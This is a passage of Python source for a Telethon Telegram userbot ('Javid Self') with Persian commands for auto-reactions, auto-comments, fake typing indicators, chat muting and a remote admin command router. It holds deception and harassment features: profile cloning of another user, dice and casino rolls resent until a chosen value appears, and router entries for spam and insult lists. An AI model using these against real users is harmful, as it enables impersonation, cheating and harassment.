        elif getattr(user, 'usernames', None):
            active_nft = next((u.username for u in user.usernames if getattr(u, 'active', False)), None)
            if active_nft:
                username = f"@{active_nft}"

        first_name = get_display_name(user)
        mention = f"[{first_name}](tg://user?id={user_id})"

        photos = await client(GetUserPhotosRequest(user_id, offset=0, max_id=0, limit=0))
        profile_photo = photos.photos[0] if photos.photos else None
        photo_count = getattr(photos, 'count', len(photos.photos))

        caption = f"""اطلاعات کاربر:

╮ نام کاربر : {mention}
│ آیدی عددی : `{user_id}`
│ یوزرنیم : {username}
╯ تعداد تصاویر پروفایل : `{photo_count}` عدد"""
        if profile_photo:
            with tempfile.NamedTemporaryFile(delete=False, suffix=".jpg") as tmpfile:
                file_path = tmpfile.name
            await client.download_media(profile_photo, file=file_path)

            await client.send_file(
                event.chat_id,
                file=file_path,
                caption=caption,
                parse_mode="md",
                reply_to=(
                    reply.id if reply else (
                        event._original.id if is_admin else None
                    )
                )
            )
            os.remove(file_path)
        else:
            if reply:
                await wait_msg.edit(caption, parse_mode="md")
                wait_msg = None
            else:
                if is_admin:
                    await wait_msg.delete()
                    await event._original.reply(caption, parse_mode="md")
                    wait_msg = None
                else:
                    await wait_msg.edit(caption, parse_mode="md")
                    wait_msg = None

    except Exception as e:
        print(f"{e}")
        await wait_msg.edit("╮ خطا در دریافت اطلاعات کاربر! | Javid Self")
        return

    try:
        if wait_msg:
            await wait_msg.delete()
    except:
        pass

@client.on(events.NewMessage(outgoing=True, pattern=r'^تنظیم ری اکشن(?: (.+))?$'))
async def set_react_handler(event):
    if not self_enabled:
        return
    is_admin = is_fake_event(event)
    reply = await (event._original.get_reply_message() if is_admin else event.get_reply_message())

    args = event.pattern_match.group(1)
    if not args and not reply:
        return await event.edit("╮ استفاده نادرست از دستور! | Javid Self")

    rargs = args.split() if args else []
    if reply and len(rargs) == 1:
        rargs.append(str(reply.sender_id))

    if len(rargs) < 2:
        return await event.edit("╮ استفاده نادرست از دستور! | Javid Self")

    emoji = rargs[0]
    raw_user = rargs[1]

    try:
        user_id = int(raw_user)
    except ValueError:
        user_id = await resolve_user_id(client, raw_user)

    if user_id:
        auto_react[user_id] = emoji
        await event.edit(f"╮ ری‌اکشن {emoji} روی کاربر `{raw_user}` تنظیم شد. | Javid Self")
    else:
        await event.edit("╮ کاربر پیدا نشد! | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^لیست ری اکشن$'))
async def list_react_handler(event):
    if not self_enabled:
        return
    if not auto_react:
        await event.edit("╮ لیست ری‌اکشن خالی است. | Javid Self")
    else:
        lines = [f"`{uid}` : {emoji}" for uid, emoji in auto_react.items()]
        await event.edit("╮ لیست ری‌اکشن:\n" + "\n".join(lines))

@client.on(events.NewMessage(outgoing=True, pattern=r'^حذف ری اکشن(?: (.+))?$'))
async def remove_react_handler(event):
    if not self_enabled:
        return
    is_admin = is_fake_event(event)
    reply = await (event._original.get_reply_message() if is_admin else event.get_reply_message())
    arg = event.pattern_match.group(1)

    target = None

    if reply and not arg:
        target = reply.sender_id
    elif arg:
        try:
            target = int(arg)
        except ValueError:
            target = await resolve_user_id(client, arg)

    if target and target in auto_react:
        auto_react.pop(target)
        display_target = arg if arg else target
        await event.edit(f"╮ ری‌اکشن کاربر `{display_target}` حذف شد. | Javid Self")
    else:
        await event.edit("╮ خطا در حذف ری‌اکشن! | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^پاکسازی لیست ری اکشن$'))
async def remove_all_react_handler(event):
    if not self_enabled:
        return
    auto_react.clear()
    await event.edit("╮ لیست ری‌اکشن خالی شد. | Javid Self")

@client.on(events.NewMessage(incoming=True))
async def react(event):
    if not self_enabled:
        return
    if event.sender_id in auto_react and event.chat_id != the_gap:
        emoji = auto_react[event.sender_id]
        try:
            await client(functions.messages.SendReactionRequest(
                peer=event.chat_id,
                msg_id=event.id,
                reaction=[types.ReactionEmoji(emoticon=emoji)],
                big=True
            ))
        except Exception as e:
            print(f"{e}")

@client.on(events.NewMessage(outgoing=True, pattern=r'^تنظیم کامنت اول (.+)$'))
async def add_comment_channel(event):
    if not self_enabled:
        return
    try:
        arg = event.pattern_match.group(1).strip()

        if arg.isdigit():
            arg = int(arg)

        entity = await client.get_entity(arg)

        if not hasattr(entity, "broadcast") or not entity.broadcast:
            return await event.edit("╮ آیدی مربوط به کانال نیست! | Javid Self")

        comment_channels.add(entity.id)
        await event.edit(f"╮ ارسال کامنت اول برای کانال **{entity.title}** تنظیم شد. | Javid Self")
    except Exception:
        await event.edit("╮ کانال یافت نشد! | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^حذف کامنت اول (.+)$'))
async def remove_comment_channel(event):
    if not self_enabled:
        return
    try:
        arg = event.pattern_match.group(1).strip()

        if arg.isdigit():
            arg = int(arg)

        entity = await client.get_entity(arg)

        if not hasattr(entity, "broadcast") or not entity.broadcast:
            return await event.edit("╮ آیدی مربوط به کانال نیست! | Javid Self")

        comment_channels.discard(entity.id)
        await event.edit(f"╮ ارسال کامنت اول برای کانال **{entity.title}** لغو و حذف شد. | Javid Self")
    except Exception:
        await event.edit("╮ کانال یافت نشد! | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^تنظیم کامنت$'))
async def set_comment_message(event):
    if not self_enabled:
        return
    is_admin = is_fake_event(event)
    reply = await (event._original.get_reply_message() if is_admin else event.get_reply_message())

    if not reply:
        return await event.edit("╮ استفاده نادرست از دستور! | Javid Self")

    if reply.media:
        return await event.edit("╮ فقط متن مجاز است! | Javid Self")

    if reply.text:
        comment_content["text"] = reply.text
        short_text = reply.text[:20] + "..." if len(reply.text) > 20 else reply.text
        await event.edit(f"╮ متن کامنت اول تنظیم شد:\n`{short_text}` | Javid Self")
    else:
        await event.edit("╮ پیام خالی است! | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^لیست کامنت$'))
async def list_comment_channels(event):
    if not self_enabled:
        return
    if not comment_channels:
        return await event.edit("╮ خالی!")

    result = "╮ لیست کانال‌های کامنت:\n\n"
    result += "\n".join([f"> `{cid}`" for cid in comment_channels])
    await event.edit(result)

@client.on(events.NewMessage(outgoing=True, pattern=r'^پاکسازی لیست کامنت$'))
async def clear_comment_channels(event):
    if not self_enabled:
        return
    comment_channels.clear()
    await event.edit("╮ لیست کامنت خالی شد. | Javid Self")

@client.on(events.NewMessage(incoming=True, forwards=True))
async def auto_comment_handler(event):
    if not self_enabled:
        return
    fwd = event.forward
    if not fwd or not fwd.chat:
        return

    chan_id = fwd.chat.id
    if chan_id not in comment_channels:
        return

    try:
        text = comment_content.get("text")
        if text:
            await client.send_message(
                event.chat_id,
                message=text,
                reply_to=event.id
            )
    except Exception as e:
        print(f"{e}")

@client.on(events.NewMessage(outgoing=True, pattern=r'^تاس (\d+)$'))
async def dice_handler(event):
    if not self_enabled:
        return
    
    target_value = int(event.pattern_match.group(1))
    if target_value < 1 or target_value > 6:
        await event.edit("╮ عدد تاس باید بین 1 تا 6 باشد! | Javid Self")
        return

    chat_id = event.chat_id
    reply_to = event.reply_to_msg_id if event.is_reply else None
    
    try:
        await event.delete()
    except:
        pass

    active_dice_tasks[chat_id] = True
    last_msg = None

    while active_dice_tasks.get(chat_id):
        if last_msg:
            try:
                await last_msg.delete()
            except:
                pass
                
        msg = await client.send_message(chat_id, file=types.InputMediaDice(emoticon='🎲'), reply_to=reply_to)
        
        if msg.media and msg.media.value == target_value:
            break
        
        last_msg = msg
        await asyncio.sleep(0.2)
        
    if chat_id in active_dice_tasks:
        del active_dice_tasks[chat_id]


@client.on(events.NewMessage(outgoing=True, pattern=r'^کازینو (.+)$'))
async def casino_handler(event):
    if not self_enabled:
        return
    
    input_val = event.pattern_match.group(1).strip()
    
    casino_values = {
        "🎰": 64, "777": 64,
        "🍋🍋🍋": 43, "🍌🍌🍌": 22,
        "bar": 1, "BAR": 1
    }
    
    valid_numbers = [1, 22, 43, 64]
    target_value = casino_values.get(input_val)
    
    if not target_value:
        if input_val.isdigit():
            target_value = int(input_val)
            if target_value not in valid_numbers:
                await event.edit("╮ عدد کازینو فقط می‌تواند یکی از اعداد 1، 22، 43 یا 64 باشد! | Javid Self")
                return
        else:
            await event.edit("╮ علامت کازینو نامعتبر است! (مثال: کازینو 777 یا کازینو 🍋🍋🍋) | Javid Self")
            return

    chat_id = event.chat_id
    reply_to = event.reply_to_msg_id if event.is_reply else None
        
    try:
        await event.delete()
    except:
        pass

    active_casino_tasks[chat_id] = True
    last_msg = None

    while active_casino_tasks.get(chat_id):
        if last_msg:
            try:
                await last_msg.delete()
            except:
                pass
                
        msg = await client.send_message(chat_id, file=types.InputMediaDice(emoticon='🎰'), reply_to=reply_to)
        
        if msg.media and msg.media.value == target_value:
            break
            
        last_msg = msg
        await asyncio.sleep(0.2)

    if chat_id in active_casino_tasks:
        del active_casino_tasks[chat_id]


@client.on(events.NewMessage(outgoing=True, pattern=r'^کنسل$'))
async def cancel_handler(event):
    if not self_enabled:
        return
        
    chat_id = event.chat_id
    text = ""
    
    if chat_id in active_dice_tasks:
        active_dice_tasks[chat_id] = False
        text = "╮ عملیات انداختن تاس متوقف شد. | Javid Self"
        
    if chat_id in active_casino_tasks:
        active_casino_tasks[chat_id] = False
        text = "╮ عملیات انداختن کازینو متوقف شد. | Javid Self"
        
    if text:
        try:
            await event.edit(text)
        except:
            pass

@client.on(events.NewMessage(outgoing=True, pattern=r'^کلون$'))
async def clone_profile_handler(event):
    if not self_enabled:
        return
    global original_profile, is_cloned
    
    reply = await event.get_reply_message()
    if not reply:
        await event.edit("╮ لطفاً روی پیام کاربر مورد نظر ریپلای کنید! | Javid Self")
        return
        
    await event.edit("╮ در حال کلون کردن پروفایل... | Javid Self")
    try:
        user = await reply.get_sender()
        if not user:
            await event.edit("╮ مشخصات کاربر یافت نشد! | Javid Self")
            return

        try:
            full_user = await client(functions.users.GetFullUserRequest(user.id))
            user_bio = full_user.full_user.about or ""
        except Exception:
            user_bio = ""

        if not is_cloned:
            me = await client.get_me()
            try:
                me_full = await client(functions.users.GetFullUserRequest(me.id))
                me_bio = me_full.full_user.about or ""
            except Exception:
                me_bio = ""
                
            original_profile["first_name"] = me.first_name or ""
            original_profile["last_name"] = me.last_name or ""
            original_profile["bio"] = me_bio
            is_cloned = True

        await client(functions.account.UpdateProfileRequest(
            first_name=user.first_name or "Cloned User",
            last_name=user.last_name or "",
            about=user_bio
        ))

        photos = await client(functions.photos.GetUserPhotosRequest(user_id=user.id, offset=0, limit=1, max_id=0))
        if photos.photos:
            photo = photos.photos[0]
            downloaded_photo = await client.download_media(photo)
            if downloaded_photo:
                await client(functions.photos.UploadProfilePhotoRequest(
                    file=await client.upload_file(downloaded_photo)
                ))
                if os.path.exists(downloaded_photo):
                    os.remove(downloaded_photo)
                
        await event.edit("╮ پروفایل کاربر با موفقیت کلون شد! | Javid Self")
    except Exception as e:
        await event.edit(f"╮ خطا در کلون کردن: {str(e)} | Javid Self")


@client.on(events.NewMessage(outgoing=True, pattern=r'^بازگردانی پروفایل$'))
async def restore_profile_handler(event):
    if not self_enabled:
        return
    global original_profile, is_cloned
    
    if not is_cloned:
        await event.edit("╮ شما قبلاً پروفایلی را کلون نکرده‌اید! | Javid Self")
        return
        
    await event.edit("╮ در حال بازگردانی پروفایل اصلی... | Javid Self")
    try:
        await client(functions.account.UpdateProfileRequest(
            first_name=original_profile.get("first_name", ""),
            last_name=original_profile.get("last_name", ""),
            about=original_profile.get("bio", "")
        ))

        me = await client.get_me()
        me_photos = await client(functions.photos.GetUserPhotosRequest(user_id=me.id, offset=0, limit=1, max_id=0))
        if me_photos.photos:
            top_photo = me_photos.photos[0]
            await client(functions.photos.DeletePhotosRequest(
                id=[types.InputPhoto(id=top_photo.id, access_hash=top_photo.access_hash)]
            ))
            
        is_cloned = False
        await event.edit("╮ پروفایل شما با موفقیت به حالت اول بازگشت. | Javid Self")
    except Exception as e:
        await event.edit(f"╮ خطا در بازگردانی پروفایل: {str(e)} | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^ربات$'))
async def random_self_message(event):
    if not self_enabled:
        return
    global last_self_text

    responses = [
    "درود چیکارم داری ستون؟",
    "آنلاینم چیکار کنم خب!",
    "جانم چیکار داری؟",
    "چته خب! "
    "آنلاینم:)"
    ]

    options = [r for r in responses if r != last_self_text]
    if not options:
        options = responses

    selected = random.choice(options)
    last_self_text = selected

    await event.edit(selected)

@client.on(events.NewMessage(outgoing=True, pattern=r'^وضعیت ادمین\s*\{(.+?)\}$'))
async def change_admin_prefix(event):
    if not self_enabled:
        return
    global admin_prefix
    
    new_prefix = event.pattern_match.group(1).strip()
    
    if not new_prefix:
        await event.edit("╮ پیشوند نمی‌تواند خالی باشد! | Javid Self")
        return
        
    admin_prefix = new_prefix
    await event.edit(f"╮ پیشوند دستورات ادمین با موفقیت به ` {admin_prefix} ` تغییر یافت. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^حالت چت پیوی روشن$'))
async def enable_typing_private(event):
    if not self_enabled:
        return
    global typing_mode_private
    typing_mode_private = True
    await event.edit("╮ حالت چت در پیوی روشن شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^حالت چت پیوی خاموش$'))
async def disable_typing_private(event):
    if not self_enabled:
        return
    global typing_mode_private
    typing_mode_private = False
    await event.edit("╮ حالت چت در پیوی خاموش شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^حالت چت گروه روشن$'))
async def enable_typing_group(event):
    if not self_enabled:
        return
    global typing_mode_group
    typing_mode_group = True
    await event.edit("╮ حالت چت در گروه روشن شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^حالت چت گروه خاموش$'))
async def disable_typing_group(event):
    if not self_enabled:
        return
    global typing_mode_group
    typing_mode_group = False
    await event.edit("╮ حالت چت در گروه خاموش شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^حالت بازی پیوی روشن$'))
async def enable_game_private(event):
    if not self_enabled:
        return
    global game_mode_private
    game_mode_private = True
    await event.edit("╮ حالت بازی در پیوی روشن شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^حالت بازی پیوی خاموش$'))
async def disable_game_private(event):
    if not self_enabled:
        return
    global game_mode_private
    game_mode_private = False
    await event.edit("╮ حالت بازی در پیوی خاموش شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^حالت بازی گروه روشن$'))
async def enable_game_group(event):
    if not self_enabled:
        return
    global game_mode_group
    game_mode_group = True
    await event.edit("╮ حالت بازی در گروه روشن شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^حالت بازی گروه خاموش$'))
async def disable_game_group(event):
    if not self_enabled:
        return
    global game_mode_group
    game_mode_group = False
    await event.edit("╮ حالت بازی در گروه خاموش شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^حالت ویس پیوی روشن$'))
async def enable_voice_private(event):
    if not self_enabled:
        return
    global voice_mode_private
    voice_mode_private = True
    await event.edit("╮ حالت ویس در پیوی روشن شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^حالت ویس پیوی خاموش$'))
async def disable_voice_private(event):
    if not self_enabled:
        return
    global voice_mode_private
    voice_mode_private = False
    await event.edit("╮ حالت ویس در پیوی خاموش شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^حالت ویس گروه روشن$'))
async def enable_voice_group(event):
    if not self_enabled:
        return
    global voice_mode_group
    voice_mode_group = True
    await event.edit("╮ حالت ویس در گروه روشن شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^حالت ویس گروه خاموش$'))
async def disable_voice_group(event):
    if not self_enabled:
        return
    global voice_mode_group
    voice_mode_group = False
    await event.edit("╮ حالت ویس در گروه خاموش شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^حالت ویدیو مسیج پیوی روشن$'))
async def enable_video_private(event):
    if not self_enabled:
        return
    global video_mode_private
    video_mode_private = True
    await event.edit("╮ حالت ویدیو مسیج در پیوی روشن شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^حالت ویدیو مسیج پیوی خاموش$'))
async def disable_video_private(event):
    if not self_enabled:
        return
    global video_mode_private
    video_mode_private = False
    await event.edit("╮ حالت ویدیو مسیج در پیوی خاموش شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^حالت ویدیو مسیج گروه روشن$'))
async def enable_video_group(event):
    if not self_enabled:
        return
    global video_mode_group
    video_mode_group = True
    await event.edit("╮ حالت ویدیو مسیج در گروه روشن شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^حالت ویدیو مسیج گروه خاموش$'))
async def disable_video_group(event):
    if not self_enabled:
        return
    global video_mode_group
    video_mode_group = False
    await event.edit("╮ حالت ویدیو مسیج در گروه خاموش شد. | Javid Self")

@client.on(events.NewMessage(incoming=True))
async def activity_simulator(event):
    if not self_enabled:
        return
    chat_id = event.chat_id

    if chat_id == the_gap:
        return

    is_private = event.is_private

    actions = []

    if (typing_mode_private and is_private) or (typing_mode_group and event.is_group):
        actions.append(SendMessageTypingAction())

    if (game_mode_private and is_private) or (game_mode_group and event.is_group):
        actions.append(SendMessageGamePlayAction())

    if (voice_mode_private and is_private) or (voice_mode_group and event.is_group):
        actions.append(SendMessageRecordAudioAction())

    if (video_mode_private and is_private) or (video_mode_group and event.is_group):
        actions.append(SendMessageRecordRoundAction())

    for action in actions:
        try:
            await client(SetTypingRequest(peer=chat_id, action=action))
            await asyncio.sleep(3)
        except:
            pass

@client.on(events.NewMessage(outgoing=True, pattern=r'^ربات خاموش$'))
async def disable_bot(event):
    global self_enabled
    self_enabled = False
    await event.edit("╮ ربات خاموش شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^ربات روشن$'))
async def enable_bot(event):
    global self_enabled
    self_enabled = True
    await event.edit("╮ ربات روشن شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^سکوت پیوی(?: (.+))?$'))
async def mute_pv_user(event):
    if not self_enabled:
        return

    user_input = event.pattern_match.group(1)
    reply = await event.get_reply_message()
    user_id = None
    display_name = ""

    if reply:
        user_id = reply.sender_id
        display_name = f"`{user_id}`"
    elif user_input:
        try:
            if user_input.isdigit():
                user_id = int(user_input)
                display_name = f"`{user_id}`"
            else:
                user = await client.get_entity(user_input)
                user_id = user.id
                display_name = f"@{user.username}" if user.username else f"**{user.first_name}**"
        except Exception:
            return await event.edit("╮ خطا در دریافت کاربر! | Javid Self")

    if user_id:
        if user_id not in pv_mute_list:
            pv_mute_list.append(user_id)
            await event.edit(f"╮ کاربر {display_name} به لیست سکوت پیوی اضافه شد. | Javid Self")
        else:
            await event.edit(f"╮ کاربر {display_name} از قبل در لیست سکوت وجود دارد! | Javid Self")
    else:
        await event.edit("╮ استفاده نادرست از دستور! | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^حذف سکوت پیوی(?: (.+))?$'))
async def unmute_pv_user(event):
    if not self_enabled:
        return

    user_input = event.pattern_match.group(1)
    reply = await event.get_reply_message()
    user_id = None
    display_name = ""

    if reply:
        user_id = reply.sender_id
        display_name = f"`{user_id}`"
    elif user_input:
        try:
            if user_input.isdigit():
                user_id = int(user_input)
                display_name = f"`{user_id}`"
            else:
                user = await client.get_entity(user_input)
                user_id = user.id
                display_name = f"@{user.username}" if user.username else f"**{user.first_name}**"
        except Exception:
            return await event.edit("╮ خطا در دریافت کاربر! | Javid Self")

    if user_id:
        if user_id in pv_mute_list:
            pv_mute_list.remove(user_id)
            await event.edit(f"╮ سکوت کاربر {display_name} در پیوی لغو و حذف شد. | Javid Self")
        else:
            await event.edit(f"╮ کاربر {display_name} در لیست سکوت وجود ندارد! | Javid Self")
    else:
        await event.edit("╮ استفاده نادرست از دستور! | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^لیست سکوت پیوی$'))
async def list_muted_pv_users(event):
    if not self_enabled:
        return

    if not pv_mute_list:
        return await event.edit("╮ لیست سکوت پیوی خالی است! | Javid Self")

    text = "╮ لیست سکوت پیوی:\n\n"
    for uid in pv_mute_list:
        try:
            user = await client.get_entity(uid)
            mention = f"[{user.first_name}](tg://user?id={uid})"
        except:
            mention = f"`{uid}`"
        text += f"> {mention}\n"

    await event.edit(text)

@client.on(events.NewMessage(outgoing=True, pattern=r'^پاکسازی لیست سکوت پیوی$'))
async def clear_muted_pv_users(event):
    if not self_enabled:
        return

    pv_mute_list.clear()
    await event.edit("╮ لیست سکوت پیوی خالی شد. | Javid Self")

@client.on(events.NewMessage(incoming=True))
async def delete_muted_pv_messages(event):
    if not self_enabled:
        return
    if event.is_private and event.sender_id in pv_mute_list:
        try:
            await event.delete()
        except:
            pass

from telethon.errors import TimeoutError

@client.on(events.NewMessage(outgoing=True, pattern=r'^panel$'))
async def send_inline_panel(event):
    if not self_enabled:
        return

    try:
        sender = await event.get_sender()
        if not sender:
            sender = await event.get_chat()

        bot_username = "@JavidHelperBot"
        query_text = f"panel:{sender.id}"

        results = await client.inline_query(bot_username, query_text)

        if results and len(results) > 0:
            await event.delete()

            try:
                await results[0].click(entity=event.chat_id)
            except TimeoutError:
                return
            except Exception:
                return
        else:
            await event.respond("╮ خطا در دریافت پنل! نتایجی یافت نشد. | Javid Self")

    except Exception as e:
        print(f"Error in panel: {e}")

@client.on(events.NewMessage(incoming=True))
async def admin_command_router(event):
    global admin_prefix

    if event.sender_id not in admin_list:
        return 

    text = event.raw_text

    if not text.startswith(admin_prefix):
        return

    after_prefix = text[len(admin_prefix):]

    if admin_prefix.endswith(" "):
        command_text = after_prefix
    else:

        if after_prefix.startswith(" "):
            return
        command_text = after_prefix

    class FakeEvent:
        def __init__(self, original_event, raw_text, pattern_match):
            self.message = original_event.message
            self.client = original_event.client
            self.raw_text = raw_text
            self.text = raw_text
            self.sender = original_event.sender
            self.chat_id = original_event.chat_id
            self.id = original_event.id
            self.pattern_match = pattern_match
            self._original = original_event

        async def edit(self, *args, **kwargs):
            await self._original.reply(*args, **kwargs)

        async def reply(self, *args, **kwargs):
            await self._original.reply(*args, **kwargs)

        async def get_reply_message(self):
            return None

        async def get_sender(self):
            return await self._original.get_sender()

        @property
        def is_reply(self):
            return False

    patterns = {
        r'^پنل$': help_handler,
        r'^پینگ$': ping_handler,
        r'^فونت$': font_handler,
        r'^اسم جدید (.+)$': set_name_handler,
        r'^حذف اسم (.+)$': del_name_handler,
        r'^پاکسازی لیست اسم$': clear_name_list_handler,
        r'^لیست اسم$': list_names_handler,
        r'^اسم روشن$': enable_name_rotation,
        r'^اسم خاموش$': disable_name_rotation,
        r'^فامیل جدید (.+)$': set_family_handler,
        r'^حذف فامیل (.+)$': del_family_handler,
        r'^پاکسازی لیست فامیل$': clear_family_list_handler,
        r'^لیست فامیل$': list_family_handler,
        r'^فامیل روشن$': enable_family_rotation,
        r'^فامیل خاموش$': disable_family_rotation,
        r'^بیو جدید (.+)$': set_bio_handler,
        r'^حذف بیو (.+)$': del_bio_handler,
        r'^پاکسازی لیست بیو$': clear_bio_list_handler,
        r'^لیست بیو$': list_bios_handler,
        r'^بیو روشن$': enable_bio_rotation,
        r'^بیو خاموش$': disable_bio_rotation,
        r'^فونت ساعت اسم (\d+)$': set_time_font_name,
        r'^فونت تاریخ اسم (\d+)$': set_date_font_name,
        r'^فونت ساعت فامیل (\d+)$': set_time_font_family,
        r'^فونت تاریخ فامیل (\d+)$': set_date_font_family,
        r'^فونت ساعت بیو (\d+)$': set_time_font_bio,
        r'^فونت تاریخ بیو (\d+)$': set_date_font_bio,
        r'^آنلاین روشن$': enable_online,
        r'^آنلاین خاموش$': disable_online,
        r'^تنظیم زمان 24$': set_24h_clock,
        r'^تنظیم زمان 12$': set_12h_clock,
        r'^وضعیت$': status_handler,
        r'^دانلود استوری (.+)$': download_story_handler,
        r'^دریافت استوری(?: |$)(.*)': get_stories_handler,
        r'^قفل پیوی روشن$': enable_pv_lock,
        r'^قفل پیوی خاموش$': disable_pv_lock,
        r'^تنظیم پروفایل$': set_profile_channel,
        r'^پروفایل روشن$': enable_profile_rotation,
        r'^پروفایل خاموش$': disable_profile_rotation,
        r'^تنظیم زمان پروفایل (\d+)$': set_profile_interval,
        r'^تنظیم تعداد پروفایل (\d+)$': set_profile_max_count,
        r'^ادمین$': admin_handler,
        r'^پروفایل$': profile_handler,
        r'^کاربردی$': tools_handler,
        r'^متغیر$': x_handler,
        r'^لفت همگانی کانال$': leave_all_channels,
        r'^لفت همگانی گروه$': leave_all_groups,
        r'^ذخیره زماندار روشن$': enable_save_view_once,
        r'^ذخیره زماندار خاموش$': disable_save_view_once,
        r'^آنتی لاگین روشن$': enable_anti_login,
        r'^آنتی لاگین خاموش$': disable_anti_login,
        r'^ذخیره(?: (https://t\.me/[^/]+/\d+))?$': save_message,
        r'^دانلود یوتیوب (.+)$': youtube_download_handler,
        r'^دانلود اینستا (.+)$': instagram_download_handler,
        r'^هوش مصنوعی (.+)$': gpt4_bot_handler,
        r'^سین خودکار پیوی روشن$': enable_auto_read_private,
        r'^سین خودکار پیوی خاموش$': disable_auto_read_private,
        r'^سین خودکار کانال روشن$': enable_auto_read_channel,
        r'^سین خودکار کانال خاموش$': disable_auto_read_channel,
        r'^سین خودکار گروه روشن$': enable_auto_read_group,
        r'^سین خودکار گروه خاموش$': disable_auto_read_group,
        r'^سین خودکار ربات روشن$': enable_auto_read_bot,
        r'^سین خودکار ربات خاموش$': disable_auto_read_bot,
        r'^اسپم(?: (.+))? (\d+)$': spam_handler,
        r'^تنظیم دشمن(?: (.+))?$': add_enemy,
        r'^حذف دشمن(?: (.+))?$': remove_enemy,
        r'^پاکسازی لیست دشمن$': clear_enemies,
        r'^تنظیم فحش (.+)$': add_insult,
        r'^حذف فحش (.+)$': remove_insult,
        r'^پاکسازی لیست فحش$': clear_insults,
        r'^لیست فحش$': list_insults,
        r'^لیست دشمن$': list_enemies,
        r'^دشمن$': enemy_handler,
        r'^ذخیره ویرایش روشن$': enable_savedit,
        r'^ذخیره ویرایش خاموش$': disable_savedit,
        r'^ذخیره حذف روشن$': enable_savedel,
        r'^ذخیره حذف خاموش$': disable_savedel,
        r'^منشی روشن$': enable_auto_reply,
        r'^منشی خاموش$': disable_auto_reply,
        r'^تنظیم منشی$': set_auto_reply,
        r'^تنظیم زمان منشی (\d+)$': set_auto_reply_interval,
        r'^دریافت بکاپ$': backup_handler,
        r'^اجرای بکاپ$': restore_backup,
        r'^منشی$': sec_handler,
        r'^سیستم$': system_handler,
        r'^تنظیم تاریخ (.+)$': set_date_type,
        r'^پاکسازی من (.+)$': clear_my_messages,
        r'^امروز$': today_handler,
        r'^حالت متن$': mess_handler,
        r'^\+?ایدی(?: ([^\n]+))?$': user_info_handler,
        r'^سرگرمی$': fun_handler,
        r'^تنظیم لیست فحش$': import_insult_file,
        r'^حذف ری اکشن(?: (.+))?$': remove_react_handler,
        r'^تنظیم ری اکشن(?: (.+))?$': set_react_handler,
        r'^لیست ری اکشن$': list_react_handler,
        r'^پاکسازی لیست ری اکشن$': remove_all_react_handler,
        r'^ری اکشن$': react_handler,
        r'^ربات$': random_self_message,
        r'^تنظیم کامنت اول (.+)$': add_comment_channel,
        r'^حذف کامنت اول (.+)$': remove_comment_channel,
        r'^تنظیم کامنت$': set_comment_message,
        r'^لیست کامنت$': list_comment_channels,
        r'^پاکسازی لیست کامنت$': clear_comment_channels,
        r'^کامنت اول$': comment_handler,
        r'^حالت چت پیوی روشن$': enable_typing_private,
        r'^حالت چت پیوی خاموش$': enable_typing_private,
        r'^حالت چت گروه روشن$': enable_typing_private,
        r'^حالت چت گروه خاموش$': enable_typing_private,
        r'^حالت بازی پیوی روشن$': enable_game_private,
        r'^حالت بازی پیوی خاموش$': disable_game_private,
        r'^حالت بازی گروه روشن$': enable_game_group,
        r'^حالت بازی گروه خاموش$': disable_game_group,
        r'^حالت ویس پیوی روشن$': enable_voice_private,
        r'^حالت ویس پیوی خاموش$': disable_voice_private,
        r'^حالت ویس گروه روشن$': enable_voice_group,
        r'^حالت ویس گروه خاموش$': disable_voice_group,
        r'^حالت ویدیو پیوی روشن$': enable_video_private,
        r'^حالت ویدیو پیوی خاموش$': disable_video_private,
        r'^حالت ویدیو گروه روشن$': enable_video_group,
        r'^حالت ویدیو گروه خاموش$': disable_video_group,
        r'^حالت اکشن$': action_handler,
        r'^ربات روشن$': enable_bot,
        r'^ربات خاموش$': disable_bot,
        r'^سکوت پیوی(?: (.+))?$': mute_pv_user,
        r'^حذف سکوت پیوی(?: (.+))?$': unmute_pv_user,
        r'^لیست سکوت پیوی$': list_muted_pv_users,
        r'^پاکسازی لیست سکوت پیوی$': clear_muted_pv_users,
        r'^panel$': send_inline_panel
}

    for pattern, handler in patterns.items():
        match = re.match(pattern, command_text)
        if match:
            fake_event = FakeEvent(event, command_text, match)
            await handler(fake_event)
            break

async def rotate_name():
    global current_index
    while True:
        if not self_enabled:
            await asyncio.sleep(5)
            continue
        now_tehran = datetime.now(pytz.timezone('Asia/Tehran'))
        seconds_to_next_minute = 60 - now_tehran.second - now_tehran.microsecond / 1_000_000
        await asyncio.sleep(seconds_to_next_minute)

        if rotate_enabled and name_list:
            name = name_list[current_index]

            now_dt = datetime.now(pytz.timezone('Asia/Tehran'))
            time_now = now_dt.strftime("%I:%M") if time_format_12h else now_dt.strftime("%H:%M")
            current_date = jdatetime.datetime.now().strftime("%Y/%m/%d") if date_type == "jalali" else now_dt.strftime("%Y/%m/%d")

            def stylize(text, font_number):
                if font_number == 8:
                    return random_font(text)
                return ''.join(fonts[font_number].get(ch, ch) for ch in text)

